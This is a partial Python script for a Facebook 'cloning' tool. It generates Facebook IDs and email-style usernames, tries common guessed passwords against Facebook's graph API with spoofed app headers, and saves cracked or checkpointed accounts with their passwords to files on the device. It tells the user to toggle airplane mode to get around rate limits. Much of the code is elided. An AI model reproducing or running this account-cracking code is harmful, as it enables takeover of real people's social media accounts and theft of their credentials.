...
\033[1;34m██   ██ ██   ██ ███████ ██   ██ ██   ██ ██████  
\033[1;92m════════════════════════════
\033[1;92m Owner  : SADAQAT ALI :/
\033[1;95m GitHub : SADAQAT85589 :/
\033[1;93m Version:\033[1;92m 9 \033[1;92m
\033[1;96m Status : Free :/
\033[1;94m Notice : Use 100090/100091 For OK Idz :/
\033[1;92m═══════════════════════════════════════════
 \033[1;37mHUM SHAREEF KIA HUWE POORI DUNYA BADMASH BAN GAYI )
\033[1;92m═══════════════════════════════════════════
  
            \033[1;91m\x1b[97m[\033[37;41m WELCOME TO SADAQAT FACEBOOK CLONING TOOL  \033[0;m]
'''
####@-----Menu-----@####
os.system("xdg-open https://www.facebook.com/sidaqatali.pitafi&mibextid=ZbWKwL")
def MAFIA_Main():
    os.system("clear")
    print(logo)
...
def check(session,coki):
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;92m---\033[1;96m"+gm.replace('huwtn',' SADAQAT-code=SADAQAT-33'))
    ...
    if len(game)==0:
        ...
        for gm in game:
            print(f"\033[1;92m---\033[1;92m"+gm.replace('riJan','SADAQAT-182^)Code=SADAQAT-2233]'))


####@-----Gmail-----@####

def gmail():     
        os.system('rm -rf .SADAQAT')
        ...
        for xd in range(int(limit)):
            ...
            if '3' in lchoice:
                ...
                open('.SADAQAT','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.SADAQAT','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            fo = open('.SADAQAT', 'r').read().splitlines()
...
def method():
    ...
    if 'o':      
        ...
        if lp.isnumeric():
            ex = 'firstlast first123 last123 khan123 king123'
            print(f'{oo("+")}{ex} (ETC)')
    ...
    print(f"{oo('•')}/sdcard/SADAQAT-OK.txt")
    print('\033[1;92m='*25)
    print('\033[1;91m[NOTE]     \x1b[97m[\033[37;41m USE AIRPLANE MODE ON/OFF  \033[0;m]')
    print()
    ...
    def start(user):
     try:
        ...
        sys.stdout.write('\r\033[1;91m[\033[1;92mSADAQAT-M1\033[1;91m]\033[1;92m {}-{} \033[1;91m[\033[1;92m{}\033[1;91m] \033[1;92mOK : \033[1;92m{} \033[1;92mCP : \033[1;91m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
      ...
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[1;92m[\033[1;92mSADAQAT-OK\033[1;92m] \033[1;92m'+acc+' \033[1;92m•\033[1;92m '+pword+'  ')
                open('/sdcard/SADAQAT-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;92mSADAQAT-CP\033[1;91m] \033[1;92m'+acc+' \033[1;91m•\033[1;92m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/SADAQAT-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
    ...
    def start2(user):
      ...
      try:
        ...
        try:
            ...
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;91m[\033[1;92mSADAQAT-M2\033[1;91m]\033[1;92m {}-{} \033[1;91m[\033[1;92m{}\033[1;91m] \033[1;92mOK : \033[1;92m{} \033[1;92mCP : \033[1;91m{}      \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
